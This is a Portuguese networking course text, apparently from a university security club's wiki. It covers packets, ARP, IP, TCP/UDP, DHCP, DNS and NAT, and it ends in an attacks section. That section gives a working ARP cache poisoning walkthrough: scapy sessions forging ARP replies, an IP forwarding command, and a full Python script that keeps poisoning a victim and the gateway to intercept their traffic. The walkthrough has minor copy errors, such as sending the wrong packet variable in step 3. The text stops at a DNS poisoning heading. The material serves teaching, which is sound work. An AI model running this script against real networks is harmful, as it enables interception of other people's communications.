# Pacote e Protocolo
## Protocolo
É o conjunto de normas de comunicação entre dois computadores.
Ele dita como o pacote deve ser interpretado, como ele deve ser recebido, que tipo de pacote deve ser esperado em determinada ocasião, como rearranjar os pacotes caso cheguem fora de ordem, entre outros. Ou seja, é dele que surgem as soluções para lidar com problemas de comunicação em uma rede.
## Pacote
Quando queremos transmitir informações através de uma rede, temos que dividir essa informação em diversos fragmentos para que seja possível transmitir esses dados, pois existe um limite de dados que podem percorrer uma rede. Assim, pacote é a unidade básica de informação de uma rede.

A estrutura do pacote é definida pelo tipo do pacote e pelo protocolo. Os pacotes consistem geralmente de um cabeçalho e uma carga útil. O cabeçalho mantém as informações gerais sobre o pacote, o serviço e outros dados relacionados a transmissão. Ou seja, ele contém diversas informações como a origem, o destino, a numeração do pacote dentro de uma sequência, tipo de serviço, flags, entre outras informações técnicas.

Abaixo veja um exemplo do cabeçalho de um pacote IP (internet protocol)

![Cabeçalho de um pacote IP](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2Fi.imgur.com%2Fw3OmZ8S.jpg&width=768&dpr=1&quality=100&sign=412a140f&sv=1)
### Encapsulamento
Toda camada do modelo OSI possui um protocolo que dita as regras de comunicação e funcionamento para ela. Como o mesmo pacote passa por mais de uma camada, ou seja, mais de um protocolo é aplicado a ele, é necessário haver uma forma desse pacote carregar os dados e informações relativas a cada protocolo sem interferir na integridade do resto do pacote. Para isso existe o encapsulamento.

![Encapsulamento](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2Fi.imgur.com%2Fh7uTIt9.png&width=768&dpr=1&quality=100&sign=a1b57080&sv=1)

Cada protocolo trata o pacote recebido como "data" e aplica um cabeçalho (header) em cima do pacote, sem comprometer sua integridade. Conforme o host receptor for recebendo os pacotes por cada uma das camadas, o header relativo a ela é interpretado e retirado do pacote. Isso se chama desencapsulamento.
## Comutação de pacotes
Comutação de pacotes se refere a tecnologia de comunicação utilizada no núcleo da rede em redes de computadores. Quando um computador deseja enviar uma informação a outro computador, ele encapsula a informação em vários **pacotes de dados**, encaminhando de roteador em roteador em função do endereço do destino. Nisso, ocorre um compartilhamento de recursos na forma de uma **multiplexação estatística** (os pacotes podem trafegar pela rede ocupando o mesmo espaço), ou seja, os pacotes trafegam pela rede por diversos equipamentos até chegarem ao seu destino, onde serão recolhidos e ordenados.


![](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2Fi.imgur.com%2FiXZssAh.jpg&width=768&dpr=4&quality=100&sign=c2015ab6&sv=1)


A comutação de pacotes existe em contraponto à comutação de circuitos onde uma conexão exclusiva é criada para cada comunicação, como por exemplo linha telefônica. Na de pacotes, não há reserva de recursos, mas sim um compartilhamento da estrutura da rede que é trafegada a partir do uso de pacotes endereçados.
## ARP (Adress Resolution Protocol)
Nas redes de computadores utilizamos o protocolo IP (internet protocol) na camada de rede para fazer o endereçamento dos pacotes que trafegam numa rede, como foi definido no tópico de comutação de pacotes. No entanto na camada de enlace do modelo OSI, precisamos saber o endereço físico (endereço MAC) do dispositivo para ser possível se comunicar e interagir com tal dispositivo. Para isso existe o ARP.

Basicamente cada dispositivo na rede tem uma tabela chamada de ARP Cache que conterá as seguintes informações:
- O endereço IP e o endereço MAC de cada dispositivo ouvido na rede
- O endereço IP e o endereço MAC do próprio dispositivo
Quando um host A deseja se comunicar com um host B de uma mesma rede o que acontece?
1. O host A verifica se ele conhece o endereço MAC do host B em sua ARP Cache. Caso consiga, pronto, a comunicação é encaminhada então para a camada física.
2. Caso não tenha uma entrada em sua ARP Cache, ele faz um ARP Request em Broadcast. Isso significa que ele perguntará para todos os dispositivos naquela rede ouvirem: "Qual o endereço MAC do endereço IP {IP address do host B)? Diga ao  endereço MAC {MAC addess do host A) com endereço IP {IP address do host A}". Ou seja, ao perguntar o MAC address do host B, o host A informa seu IP address e seu MAC address para toda a rede local.
3. Caso o host B se encontre na rede, ele manda um **ARP Reply** para o host A informando seu MAC address. Lembre-se que o ARP Reply é em **Unicast**, ou seja, a mensagem enviada pelo host B é endereçada especificamente ao host A, logo os outros dispositivos na rede não tem acesso a ela.
4. Agora que o host A sabe o MAC address do host B, ele continua sua comunicação na camada física.

Uma tecnologia usada para evitar que as ARP Caches fiquem demasiadamente grandes é a TTL (Time To Live). Ela se baseia na ideia de que uma entrada na ARP Cache tem um tempo de validade. Ou seja, se o host A tem uma entrada em sua ARP Cache para o host B em algum momento, ele vai deixar de ter, devido ao TTL e vai ser novamente necessário realizar um ARP Request para reconquistar a entrada do host B.

O protocolo ARP funciona em cooperação com o protocolo IPv4 e deixa de ser usado no IPv6 onde é substituído pelo protocolo NDP (Neighbor Discovery Protocol).
# Camada de Rede
É nessa camada que podemos começar a falar de internet, pois ela é baseada nas camadas de TCP/IP, na verdade, elas são as diretrizes práticas para a implementação da camada de transporte e de rede respectivamente. A camada de rede (a teórica do modelo OSI) é responsável por garantir o envio e roteamento de pacotes entre computadores em redes distintas. Para realizar esse tarefa, ela implementa os seguintes mecanismos:
- Endereçamento lógico e hierárquico
- Roteamento de pacotes
- Interfaces de rede
## Endereçamento Lógico
Endereçamento virtual de cada nó (aparelho) na rede. Esse endereçamento não é fixo como o MAC address, que é intrínseco ao hardware, mas sim alocado de acordo com algum protocolo especificado. Vale mencionar que ele pode ser alocado estaticamente (fixo) ou dinamicamente (um servidor designa os endereços conforme necessário).

Vale salientar que o endereço dessa camada possui duas partes com funções diferentes. A primeira parte é a identificação da rede a qual o nó pertence, dessa forma podemos identificar quais computadores estão interligados pela mesma rede. A segunda parte é a identificação do computador propriamente dito.
## IPv4
Foi o primeiro protocolo amplamente usado para endereçamento lógico. Ele descreve cada endereço usando 32 bits em 4 seções de 1 byte, ou seja, 4 octetos.
![IPv4](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2F1857820393-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-M2BqbbxnmfvPTRrxNQc%252Fsync%252F4021239cbcbd97d16857f772865e9b872a374278.png%3Fgeneration%3D1618639761877467%26alt%3Dmedia&width=768&dpr=1&quality=100&sign=49fbd4c8&sv=1)
## IPv6
Veio para expandir a quantidade de endereços cobertos pelo IPv4. Ele descreve os endereços com 128 bits ou 8 grupos de 4 dígitos hexadecimais.
![IPv6](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2F1857820393-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-M2BqbbxnmfvPTRrxNQc%252Fsync%252F85cdbba4663c6988bb3c30fbae4d151f31cba734.png%3Fgeneration%3D1618639762926200%26alt%3Dmedia&width=768&dpr=1&quality=100&sign=cb3f904f&sv=1)
Além disso ele possui duas características muito úteis:
- Retrocompatibilidade com IPv4
	- IPv4: 192.0.2.33
	- IPv6: ::ffff:192.0.2.33 (só usar o ::ffff: a esquerda)
- Compressão de endereços por omissão de 0 a esquerda
	- IPv6: 2001:0db8:c9d2:0012:0000:0000:0000:0051
	- IPv6 comprimido: 2001:db8:c9d2:12::51
## Máscaras de Rede
As máscaras de rede ou Network masks são uma sequência de 4 octetos e servem para dividir um IP em duas porções: rede e host.

Para descobrirmos a porção da rede a partir de um IP, realizasse um bitwise & (AND) entre o IP e a máscara.

Efetivamente, utilizamos somente os 3 primeiros octetos para endereçar nossa rede e separamos o octeto restante para representar os 256 possíveis hosts nessa rede.

O primeiro endereço (ex: 192.0.2.**0**) é reservado como endereço da rede e o último (ex: 192.0.2.255) como endereço de broadcast ou difusão.

Para ter uma notação mais amigável, uma vez que a binária não é tão intuitiva, representamos como, por exemplo, 192.0.2.12/**24**. Nessa notação teremos um IP seguido de quantos bits estão reservados para o endereço de rede.
## Roteamento
O roteamento consiste em transportar pacotes de dados entre redes distintas, tentando ao mesmo tempo descobrir a melhor rota e entregar integralmente os dados. Para isso, vão ser utilizados endereços que identificam quais nós da rede receberão a chamada. Cada propagação de pacote, de um roteador para outro, é chamado de _hop_.

Nesse momento, trabalha-se quase exclusivamente com a parte de rede do endereço. O roteador é um equipamento especializado para fazer esse encaminhamento de pacotes e, por isso, deve estar conectado em mais de uma rede. Quando ele recebe um pacote, verifica qual o endereço de destino do pacote e procura na sua tabela de roteamento se ele está conectado nessa rede. Se ele estiver, já pode enviar o pacote para o _host_ certo (o destinatário do pacote). Caso não esteja, ele envia o pacote para alguém que tenha mais conhecimento, esta pessoa é o chamado default gateway.
## Interface de Rede
Geralmente associada à hardware, como à Placa de rede, a interface é essencial para estabelecer conexões - sem ela isso não é possivel. Cada interface identifica um aparelho para as tabelas de rota e armazena suas configurações como o IP.

Um computador pode ter mais de uma interface, o que possibilita distribuir o tráfego entre as interfaces ou simplesmente oferecer serviços diferentes.

Um exemplo extremamente importante de interface virtual é a interface _loopback_ ou _lo_ , que endereça a própria máquina - permitindo a comunicação entre aplicações ou processos de um computador com outras aplicações ou processos nesse mesmo computador.

Para vermos quais interfaces estão atualmente presentes, usamos o comando: ip address
# Camada de Transporte
## MODELO-OSI / MODELO-TCP/IP
Para facilitar o entendimento dessa parte, é válido revisitarmos um conceito muito importante visto anteriormente, o MODELO-OSI:

![](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2F1857820393-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-M2BqbbxnmfvPTRrxNQc%252Fsync%252F71c9f06cc6aa659c1de7814d4cb7fb05ae8563bf.png%3Fgeneration%3D1622757890272359%26alt%3Dmedia&width=768&dpr=4&quality=100&sign=5cf32dcc&sv=1)

Nessa etapa, estamos estudando a camada 4 ("Transporte"). Esta é responsável pela transferência de dados entre máquinas, reunindo diversos protocolos, entre eles, os protocolos TCP e UDP, que serão vistos em seguida.

É válido ressaltar que existe uma simplificação desse famoso Modelo-OSI, conhecido como Modelo-TCP/IP. Basicamente o primeiro demonstra como realmente a comunicação entre computadores acontece, descrevendo minuciosamente todos os passos. Já o segundo, demonstra como funciona essa comunicação na prática. As diferenças entre eles podem ser observadas na seguinte imagem:

![](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2F1857820393-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-M2BqbbxnmfvPTRrxNQc%252Fsync%252F14b3650018029b10372fd3ea34b4929cbc4a4e78.png%3Fgeneration%3D1622757890342867%26alt%3Dmedia&width=768&dpr=4&quality=100&sign=2a406041&sv=1)

Não podemos nos confundir ao falar que o Modelo-TCP/IP possuem apenas 2 protocolos("TCP" e "IP"). Isso porquê na realidade, o Modelo é apenas uma simplificação de todos os processos que acontecem na comunicação, porém inúmeros protocolos podem participar de tal comunicação.

## PROTOCOLOS
### TCP
O protocolo **TCP** ("Transmission Control Protocol") é o protocolo mais importante da camada de transporte, pois é responsável por estabelecer uma conexão entre dois processos em dois hosts, verificando se os dados que foram enviados foram recebidos corretamente e sem erros. Tal característica, determina que o Protocolo TCP garante a integridade dos dados a partir de uma validação, conhecida como "Checksum". Essa validação é basicamente uma conta matemática (resultando em uma HASH) que garante que tudo que foi recebido em um host foi exatamente o que foi enviado por outro host.

Outra característica muito importante de tal protocolo, é o requerimento de uma conexão ("Connection Based"). Isto é, uma determinada aplicação envia um pedido de conexão para o destino e usa a "conexão" para transferir dados.

Agora, descreveremos como acontece o estabelecimento de uma comunicação virtual conhecido como "Three-Way Handshake", do inglês, aperto de mão em três vias:

Estabelecimento de conexões:
1. O cliente envia um pacote com a flag "SYN" ativa.
2. O servidor responde com um pacote com as flags "SYN" + "ACK".
3. O cliente responde com um pacote ACK.

![](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2F1857820393-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-M2BqbbxnmfvPTRrxNQc%252Fsync%252Ffbf7527423b18b8df6bb9750cc81bcd2d0480cc3.png%3Fgeneration%3D1622757890070931%26alt%3Dmedia&width=768&dpr=4&quality=100&sign=51fd491d&sv=1)

### UDP

O protocolo UDP ("User Datagram Protocol") também é um protocolo que pertence à Camada de Transporte e tem como a principal diferença do TCP a falta de confiabilidade dos dados recebidos por um determinado host.

A princípio, isso pode parecer meio confuso, "Como assim, eu estou usando um protocolo que não me garante que o que estou recebendo foi realmente o que foi enviado??" Primeiramente, devemos entender que isso ocorre justamente porque o UDP é mais leve que o próprio TCP, e para algumas aplicações isso pode ser bastante recomendado.

Imagine que você queira assistir um filme, e a primeira coisa que te vem a mente é colocar um netflix, ou qualquer outro serviço parecido. Já parou para pensar o quão grandes os arquivos de filmes podem ser? Imagina só se a cada pacote do seu filme, tivéssemos que verificar se os dados recebidos são completamente íntegros com os pacotes enviados. Seria muito massante não é mesmo? Seu filme teria grandes chances de ficar travando o tempo inteiro.

Então, ta aí a solução para o seu problema, o Protocolo UDP. O fato desse protocolo ser mais leve, garante que serviços de streaming funcionem da maneira esperada. Algumas características sobre esse protocolo:

1. Não é Connection Based, ou seja, não existe uma conexão
2. Não garante a integridade dos pacotes
3. Não garante nem que os pacotes cheguem até o destino
## PORTAS

Para facilitar o entendimento, é possível relacionar com um delivery qualquer. Digamos que o usuário residente em um condomínio peça uma pizza por um aplicativo de delivery. O restaurante precisa saber o endereço do usuário, no entanto só isso não basta. Como o cliente mora em um condomínio, o restaurante precisa saber o número do apartamento do cliente. Em analogia com a comunicação entre dispositivos, chamamos esse número de porta.

As portas são números de 16 bits que representam canais virtuais aleatórios definidos pelo sistema operacional. Esses canais fazem com que seja possível mapear cada processo em andamento no computador. Isso garante que o dispositivo que iniciou a comunicação encontre o processo desejado no IP. Por exemplo, o usuário faz uma requisição de uma página web (por padrão, é a porta 80) e, por causa da porta HTTP, o usuário recebe realmente uma página web, mesmo que existam outras aplicações rodando em sua máquina (DNS, SSH ou FTP). Outro exemplo, o usuário faz uma requisição de uma página web HTTPS (por padrão, é a porta 443) e, por causa da porta do protocolo HTTPS, o usuário recebe realmente uma página web, mesmo que existam outras aplicações rodando em sua máquina (DNS, SSH ou FTP).

![](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2F1857820393-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-M2BqbbxnmfvPTRrxNQc%252Fsync%252F036b59abf883484ca8ed508f844cae1880d722e3.png%3Fgeneration%3D1622757891011080%26alt%3Dmedia&width=768&dpr=4&quality=100&sign=585bb0fd&sv=1)

## SOCKET

O **socket** é o ponto final de uma comunicação. Do inglês "tomada", o socket faz a parte chave e fechadura da comunicação similar ao diagrama a baixo.

![](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2F1857820393-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-M2BqbbxnmfvPTRrxNQc%252Fsync%252Fdb53bf29dcf2ee85b219cbe476070860ab57383a.png%3Fgeneration%3D1622757889781072%26alt%3Dmedia&width=768&dpr=4&quality=100&sign=7178c036&sv=1)

O socket é identificado por uma composição do endereço IP e de uma porta. Portanto, uma conexão TCP é identificada por um par de sockets (host1, port1) e (host2, port2). Com isso, conclui-se que é possível trocar dados entre dois processos (portas).

Em suma, um socket conecta um processo a uma porta do computador. A conexão cliente-servidor ocorre entre processos através de uma porta, que não necessariamente devem ser iguais.
# IANA
IANA (Internet Assigned Numbers Authority), é uma organização que define muitos padrões na internet, como alocação de IPs, portas padrão, domínios, entre outros.
# Three-way Handshake
O Three-way Handshake (que pode ser traduzido como "aperto de mão de três vias") é um mecanismo especificado na documentação do protocolo TCP para o estabelecimento de conexões TCP.

Definições:
- ACK = Acknowledgement flag (Flag de reconhecimento)
- SYN = Synchronize flag (Flag de sincronização)

Flags são nada mais do que bits em um pacote TCP. Por exemplo, é convencionado que 2 bits são, respectivamente, as flags ACK e SYN. Se você recebe um pacote e esses bits são 10 então esse pacote tem a flag ACK ativa, se eles são 11 então o pacote é SYN/ACK, e assim por diante (o TCP tem mais flags além dessas duas, como FIN e RST).

Uma conexão TCP é geralmente estabelecida em 3 etapas:
1. O cliente envia um pacote com a flag SYN ativa.
2. O servidor responde com um pacote com as flags SYN + ACK.
3. O cliente reponde com um pacote com a flag ACK.

Em outras palavras, a conexão entre cliente e servidor a partir do Three-way Handshake pode ser explicada da seguinte maneira:

1. Cliente: Servidor, estou enviando a mensagem com número de sequência 100 (SEQ=100). Dá pra sincronizar (SYN)?
	Cliente -----SYN---> Servidor
2. Servidor: Claro (ACK), sincroniza a mensagem 200 (SEQ=200) que estou enviando (SYN). Prossiga com a mensagem 101 (ACK=101).
	Cliente <---SYN---- Servidor
3. Cliente: Ok, recebi a mensagem 200 (ACK=201), estou enviando a mensagem 101 (SEQ=101).
	Cliente ------------> Servidor

O cliente e o servidor, possuem números de sequência distintos, por este motivo é necessária a sincronização (SYN) em ambos os sentidos.

Feita a sincronização, começam a troca de pacotes com base em números de sequência, que tem o objetivo de enumerar os pacotes de cada um.
# DHCP
O DHCP(Dynamic Host Configuration Protocol) é um protocolo de gerenciamento utilizado para facilitar a configuração de um dispositivo numa rede. Ao invés de serem necessárias configurações manuais (e que exigem conhecimento da estrutura da rede), a configuração é feita entre o cliente e o **Servidor DHCP**.
## O servidor DHCP
O servidor DHCP é uma máquina que internamente tem os parâmetros da rede, como servidores DNS e uma relação de endereços IP disponíveis. Em redes domésticas, tipicamente o roteador assume todas as funções possíveis, para reduzir espaço e complicações. Portanto, o que chamamos de roteador é, ao mesmo tempo: modem(no caso de o dispositivo que se conecta à fibra óptica ou cabo coaxial e ele prover a conexão WAN), roteador, servidor DHCP, entre outros. No entanto, não há problema nenhum em utilizar um outro servidor DHCP na rede, o que geralmente é necessário quando se tem uma rede mais complexa ou customizada, que permite ser tanto um servidor DHCP quanto um servidor DNS.
## Parâmetros configurados
- Endereço IP do cliente
- Gateway da rede: roteador por onde sai a informação.
- Servidores DNS:
- Máscara da sub-rede: o "tamanho" da rede
- Tempo de concessão do endereço (Lease time): O tempo que o servidor DHCP "empresta" o endereço.
## Processo de configuração.
O processo é realizado através de pacotes UDP. As portas padrão para isso são 67 no servidor e 68 no cliente.
![](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2Fupload.wikimedia.org%2Fwikipedia%2Fcommons%2Fthumb%2Fe%2Fe4%2FDHCP_session.svg%2F260px-DHCP_session.svg.png&width=768&dpr=4&quality=100&sign=22455ce1&sv=1)
1. Discovery: O cliente envia um pacote de descoberta para toda a rede.
2. Offer: Um (ou mais) servidores DHCP oferecem a configuração, consistindo tipicamente de endereço IP, servidores DNS, lease time e gateway padrão.
3. Request: O cliente pede a oferta ao servidor DHCP.
4. Acknowledgement: O servidor reconhece a oferta, e envia a mensagem encerrando o processo.
# DNS
DNS (Domain Name System) é a razão pela qual não precisamos inserir o endereço IP quando vamos fazer uma simples busca na internet. É um protocolo no qual pede-se um endereço IP baseado em um nome, ou domínio.
## Domínios e Subdomínios
Os domínios são os nomes que podem ser registrados, no contexto de DNS e Internet. Consistem de duas partes, sendo o domínio de fato e a raiz de domínio. Por exemplo: usp.br é um domínio que pertence à raiz .br Os subdomínios pertencem aos domínios, mas ao registrar um domínio, é possível criar um número infinito(virtualmente) de subdomínios. Domínios e subdomínios podem corresponder a endereços distintos. Por exemplo, o domínio icmc.usp.br, no qual o site do ICMC é hospedado, corresponde a um servidor, mas o domínio ganesh.icmc.usp.br provavelmente não é servido no mesmo servidor.
## Servidores DNS
Os servidores DNS são máquinas acessíveis na rede que possuem tabelas de correspondência entre domínios (e subdomínios) e endereços de rede. Mas agora, já se perguntou a quantidade de domínios que existem? Não seria muito viável ter todas essas relações em um único local. Imagina só como seria para uma máquina lidar com as requisições do mundo todo. Para isso, o sistema de domínios é arquitetado de uma forma distribuída. Os servidores DNS têm uma lista de quais são outros servidores que podem ter o domínio procurado. Ao fazer uma requisição DNS para o servidor, se ele não possui a entrada (par domínio:ip) ele delega para outro servidor que está em sua lista.
# NAT
Nat não é um apelido para Natália. NAT(Network Address Translation) é o motivo pelo qual podemos ter "apenas" 4.2 bilhões de endereços IPv4, mas o número de dispositivos conectados ser muito maior. Esta é parte da resposta de "Por que o meu endereço IP é sempre 192.168.X.X na rede da minha casa e da casa de outras pessoas?".
## Estrutura de uma rede com NAT
O tipo mais básico de NAT provavelmente utilizamos todos os dias. Trata-se das redes locais domésticas. Primeiramente, vale entender que a faixa de endereços 192.168.0.0/24 é reservada justamente para uso em redes locais.
## Como é feita a tradução de endereços
O gateway que realiza a NAT possui uma tabela interna, que armazena a relação entre saída e os cientes.
## Exemplo de comunicação através de NAT
Rede hipotética
![](https://gitbook.ganeshicmc.com/~gitbook/image?url=https%3A%2F%2F1857820393-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-M2BqbbxnmfvPTRrxNQc%252Fsync%252F0317df0bb95f44edd33ee36d55722f9a4cac902a.png%3Fgeneration%3D1618519772447941%26alt%3Dmedia&width=768&dpr=4&quality=100&sign=31ed6bc6&sv=1)
# Ataques
## Man in the Middle (MITM)
A ideia do ataque é simples: o invasor se posiciona entre as duas pontas de uma comunicação, interceptando as mensagens trocadas. Na prática, no entanto, é algo um pouco mais complexo, pois para funcionar direito, o atacante não pode ser detectado.
## ARP Cache Poisoning
### Objetivo
O objetivo desse ataque é "envenenar" a arp cache, tanto da vítima quanto do gateway padrão (dentro de uma rede), escrevendo informações falsas nelas e fazendo com que o atacante finja ser o gateway para a vítima e vice-versa (um MITM). O invasor, então, encaminha os dados para os devidos endereços, tornando uma comunicação completa, porém agora tudo passa por ele, o que cria uma abertura para outros tipos de ataque.
### Como funciona
Antes de fazer o ataque em si, o invasor precisa conhecer os IPs da vítima e do gateway e, para isso, ele faz um _scan_ na rede e identifica esses dados.

Com isso em mãos, o atacante realiza _broadcasts_ para descobrir os respectivos MACs daqueles IPs e, no momento em que as ARP caches forem atualizadas, ele irá mandar um "replies safados", sobrepondo os MACs do gateway e da vítima com o seu no lugar.

Nesse momento, as comunicações serão entre gateway e invasor e entre vítima e invasor. Para se manter em anonimato, o invasor redireciona os pacotes que recebe, fechando a comunicação original.
### O ataque na prática
Para realizar o ataque, usaremos duas ferramentas, principalmente: o nmap e o scapy
#### Nmap
É um programa que realiza _port scan_, descobrindo hosts e serviços em uma rede.
#### Scapy
Scapy é uma ferramenta que permite ao usuário enviar, sniffar, dissecar e forjar pacotes.
##### Instalação
```
$ git clone https://github.com/secdev/scapy.git
$ cd scapy
$ sudo python3 setup.py install
```
ou
```
$ sudo pacman -S python3-scapy
```
#### O ataque
- Passo 0: identificar hosts (vítimas) na rede
```
$ sudo nmap 192.168.1.0/24 -sC
```
Supondo que o atacante tenha achado o host `192.168.1.101`
- Iniciando o Scapy
```
$ scapy
```
- 1º passo: Identificar o MAC Address da vítima e do default gateway
- Solução: arp request e arp reply
- Default gateway:
```
>>> arprequest1 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst = "192.168.1.1")
>>> arprequest1.show()
###[ Ethernet ]### 
  dst= ff:ff:ff:ff:ff:ff
  src= 28:56:5a:49:ff:67
  type= ARP
###[ ARP ]### 
     hwtype= 0x1
     ptype= IPv4
     hwlen= None
     plen= None
     op= who-has
     hwsrc= 28:56:5a:49:ff:67
     psrc= 192.168.1.103
     hwdst= 00:00:00:00:00:00
     pdst= 192.168.1.1

>>> arpreply1 = srp(arprequest1)
Begin emission:
Finished sending 1 packets.
*
Received 1 packets, got 1 answers, remaining 0 packets
>>> arpreply1[0][0][1]
(<<Ether  dst=28:56:5a:49:ff:67 src=c4:e9:84:9a:14:16 type=ARP |<ARP
hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=c4:e9:84:9a:14:16
psrc=192.168.1.1 hwdst=28:56:5a:49:ff:67 pdst=192.168.1.103 |>>)
```
Observe que o arp request faz um broadcast (`dst=ff:ff:ff:ff:ff:ff:ff`), carrega a operação 1 (`who-has`), com o hwdst (MAC address de destino) desconhecido e o `pdst` (IP de destino ) `192.168.1` . Ou seja, quando enviado com o `srp` pergunta à todos qual é o MAC do `192.168.1.1` e aguarda uma resposta.

O gateway recebe essa request e envia uma reply que chega como retorno do `srp` (arpreply1). É possível perceber que o `arpreply1` carrega a operação 2 (is-at) e tem como `hwsrc` (MAC Address de onde saiu) `c4:e9:84:9a:14:16`, que é justamente o MAC do gateway que queríamos.

- Vítima:
```
>>> arprequest2 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst = "192.168.1.101")
>>> arprequest2.show()
###[ Ethernet ]### 
  dst= ff:ff:ff:ff:ff:ff
  src= 28:56:5a:49:ff:67
  type= ARP
###[ ARP ]### 
     hwtype= 0x1
     ptype= IPv4
     hwlen= None
     plen= None
     op= who-has
     hwsrc= 28:56:5a:49:ff:67
     psrc= 192.168.1.103
     hwdst= 00:00:00:00:00:00
     pdst= 192.168.1.101

>>> arpreply2 = srp(arprequest2)
Begin emission:
Finished sending 1 packets.
*
Received 1 packets, got 1 answers, remaining 0 packets
>>> arpreply2[0][0][1]
(<<Ether  dst=28:56:5a:49:ff:67 src=c4:e9:84:9a:14:16 type=ARP |<ARP
hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=b4:2e:99:f4:b7:df
psrc=192.168.1.1 hwdst=28:56:5a:49:ff:67 pdst=192.168.1.103 |>>)
```
A mesma observação feita para o gateway vale para a vítima.
- 2º passo: “envenenar” o arp cache da vítima na linha do default gateway, preenchendo com o MAC address do atacante
- Solução: fake arp reply
```
>>> arppoison1 = ARP(op = 2, psrc = "192.168.1.1", pdst = "192.168.1.101", hwdst = "b4:2e:99:f4:b7:df")
>>> arppoison1.show()
###[ ARP ]### 
  hwtype= 0x1
  ptype= IPv4
  hwlen= None
  plen= None
  op= is-at
  hwsrc= 28:56:5a:49:ff:67
  psrc= 192.168.1.1
  hwdst= b4:2e:99:f4:b7:df
  pdst= 192.168.1.101

>>> send(arppoison1)
.
Sent 1 packets.
```
Observe que o que está sendo enviado para a vítima (`192.168.1.101` no MAC `b4:2e:99:f4:b7:df`) é que o IP `192.168.1.1` (default gateway) está (`is-at`) no MAC `28:56:5a:49:ff:67` (`hwsrc`) que na verdade é o MAC do atacante.
- 3º passo: “envenenar” o arp cache do default gateway na linha da vítima, preenchendo com o MAC address do atacante
- Solução: fake arp reply
```
>>> arppoison2 = ARP(op = 2, psrc = "192.168.1.101", pdst = "192.168.1.1", hwdst = "c4:e9:84:9a:14:16")
>>> arppoison1.show()
###[ ARP ]### 
  hwtype= 0x1
  ptype= IPv4
  hwlen= None
  plen= None
  op= is-at
  hwsrc= 28:56:5a:49:ff:67
  psrc= 192.168.1.101
  hwdst= c4:e9:84:9a:14:16
  pdst= 192.168.1.1

>>> send(arppoison1)
.
Sent 1 packets.
```
Observe agora que o que está sendo enviado para o gateway (`192.168.1.1` no MAC `c4:e9:84:9a:14:16`) é que o IP `192.168.1.101` (vítima) está (`is-at`) no MAC `28:56:5a:49:ff:67` (`hwsrc`) que na verdade é o MAC do atacante.

A partir desse momento, o gateway acha que a vítima está no MAC do atacante assim como a vítima acha que o gateway está no mesmo MAC malicioso.
##### Problemas
Porém, só com isso, esse ataque ainda não é efetivo por 2 motivos:
1. Os pacotes saem do gateway e chegam no atacante, mas não vão até a vítima, assim como saem da vítima e chegam no atacante, mas não vão pro gateway. É preciso fazer com que o atacante encaminhe os pacotes para o IP certo quando passam por ele.
2. A arp cache possui um tempo de verificação de linhas obsoletas, fazendo novos arp requests para atualizá-la. Após o ataque ser feito uma vez, depois de um curto período de tempo, a cache voltaria ao normal.
##### Soluções
1. Para encaminhar pacotes para os devidos IP's exitem 2 maneiras:
Pelo próprio kernel
```
$ echo 1 > /proc/sys/net/ipv4/ip_forward
```
ou
Utilizando o iptables
```
sudo apt install iptables
```
1. Para burlar o refresh da arp cache, o atacante pode enviar continuamente fake replys para sempre que um request for feito, já haja um fakereply pronto para responder. E isso pode ser feito com um [script](https://github.com/guilhermehiromoto/arp-cache-poisoning/blob/master/arp.py) em python.
```
from scapy.all import *
import time

def getmac(targetip):
    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
    targetmac = srp(arppacket)[0][0][1].hwsrc
    return targetmac

def poisonarpcache(targetip, targetmac, sourceip):
    spoofed = ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
    send(spoofed)

def restorearp(targetip, targetmac, sourceip, sourcemac):
    packet = ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
    send(packet)
    print ("ARP Table restored to normal for", targetip)

def main():
    targetip = input("Enter Target IP:")
    gatewayip = input("Enter Gateway IP:")

    try:
        targetmac = getmac(targetip)
    except:
         print("Target machine did not respond to ARP broadcast")
         quit()

    try:
        gatewaymac= getmac(gatewayip)
    except:
         print("Gateway is unreachable")
         quit()

    try:
        print ("Sending spoofed ARP replies")
        while True:
            time.sleep(5) 
            poisonarpcache(targetip, targetmac, gatewayip)
            poisonarpcache(gatewayip, gatewaymac, targetip)

    except KeyboardInterrupt:
        print ("ARP spoofing stopped")
        restorearp(gatewayip, gatewaymac, targetip, targetmac)
        restorearp(targetip, targetmac, gatewayip, gatewaymac)
        quit()

if __name__=="__main__":
    main()
```

## DNS Cache Poisoning
Comando: dig domínio

**Uma breve intuição de como funciona**
